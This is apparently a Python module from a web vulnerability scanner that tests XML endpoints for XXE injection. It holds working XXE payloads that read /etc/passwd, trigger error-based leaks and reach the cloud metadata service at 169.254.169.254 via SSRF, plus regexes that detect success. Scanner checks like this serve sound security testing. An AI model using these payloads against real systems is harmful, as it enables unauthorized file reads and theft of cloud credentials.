"""XXE (XML External Entity) injection check."""

from __future__ import annotations

import re

import httpx

from .base import BaseCheck, FindingDraft
from ....utils.evidence import format_request, format_response

# XXE payloads targeting /etc/passwd and error-based detection
_XXE_PAYLOADS = [
    # Classic file read
    (
        "file_read",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
    ),
    # Error-based (triggers parser error with path)
    (
        "error_based",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/xxe_probe">]>
<root><data>&xxe;</data></root>""",
    ),
    # SSRF via XXE
    (
        "ssrf",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",
    ),
]

_XML_CONTENT_TYPES = {
    "text/xml", "application/xml", "application/soap+xml",
    "application/xhtml+xml",
}

# Indicators of successful XXE
_SUCCESS_PATTERNS = [
    r"root:.*:0:0:",                  # /etc/passwd read
    r"ami-id|instance-id",            # AWS metadata
    r"xxe_probe",                     # error-based leak
    r"java\.io\.FileNotFoundException.*xxe_probe",
    r"No such file.*xxe_probe",
]


def _is_xml_endpoint(url: str, content_type: str = "") -> bool:
    ct = content_type.lower()
    url_lower = url.lower()
    return (
        any(x in ct for x in ("xml", "soap")) or
        any(kw in url_lower for kw in ("/xml", "/soap", "/wsdl", "/api/", "upload"))
    )


def _looks_vulnerable(body: str) -> bool:
    return any(re.search(pat, body, re.I | re.S) for pat in _SUCCESS_PATTERNS)


class XXECheck(BaseCheck):
    name = "xxe"
    description = "Test XML-accepting endpoints for XXE injection"
    vuln_class = "XXE"
    references = [
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        "https://cwe.mitre.org/data/definitions/611.html",
    ]
    applicable_categories = ["injection", "configuration"]

    async def run(self, vector, client: httpx.AsyncClient, ai=None) -> list[FindingDraft]:
        findings: list[FindingDraft] = []
        url = vector.url

        if not _is_xml_endpoint(url):
            return []

        for label, payload in _XXE_PAYLOADS:
            try:
                req = client.build_request(
                    "POST", url,
                    content=payload.encode(),
                    headers={"Content-Type": "application/xml"},
                )
                resp = await client.send(req)
            except Exception:
                continue

            if resp.status_code in (400, 405, 415):
                # Endpoint doesn't accept XML — skip
                break

            if _looks_vulnerable(resp.text):
                raw_req = format_request(req)
                raw_resp = format_response(resp)

                findings.append(FindingDraft(
                    title=f"XXE Injection ({label}) at {url}",
                    vuln_class=self.vuln_class,
                    severity="critical",
                    url=url,
                    description=(
                        f"Endpoint `{url}` processed an XML External Entity. "
                        f"Payload type: `{label}`. This may allow reading local files "
                        f"or performing SSRF via the XML parser."
                    ),
                    evidence=(
                        f"Payload type: {label}\n"
                        f"Response snippet:\n{resp.text[:400]}"
                    ),
                    raw_request=raw_req,
                    raw_response=raw_resp,
                    references=self.references,
                ))
                break  # One XXE finding per URL

        return findings
